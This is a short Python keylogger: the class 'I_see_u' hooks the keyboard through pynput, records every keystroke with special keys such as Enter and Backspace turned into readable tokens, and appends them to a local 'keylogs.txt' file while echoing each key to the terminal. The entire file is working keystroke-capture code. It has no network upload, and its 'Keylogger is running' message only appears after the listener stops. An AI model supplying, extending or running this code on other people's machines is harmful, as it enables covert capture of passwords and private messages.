from pynput.keyboard import Listener
import os

class I_see_u:
    def __init__(self, time_interval):
        self.filename = "keylogs.txt"  # Log file name
        self.text = ""
        self.project_path = os.getcwd()  # Get the project folder path
        self.filepath = os.path.join(self.project_path, self.filename)  # Full path to keylogs.txt

    def on_press(self, key):
        try:
            key = str(key).replace("'", "")  # Remove extra quotes from characters
            if key == "Key.space":
                key = " "  # Replace 'Key.space' with an actual space
            elif key == "Key.enter":
                key = "\n"  # New line for Enter key
            elif key == "Key.backspace":
                key = "[BACKSPACE]"  # Indicate backspace
            elif "Key" in key:
                key = f"[{key}]"  # Show special keys in brackets
            
            # DEBUG: Print the captured key in the terminal
            print(f"Captured: {key}")  

            # Write keystroke to file
            with open(self.filepath, "a", encoding="utf-8") as file_txt:
                file_txt.write(key)
        except Exception as e:
            print(f"Error writing to file: {e}")

    def Run(self):
        print(f"Logging keys... (Saving to {self.filepath})")  # Debugging message
        with Listener(on_press=self.on_press) as listener:
            listener.join()
        print("Keylogger is running...")
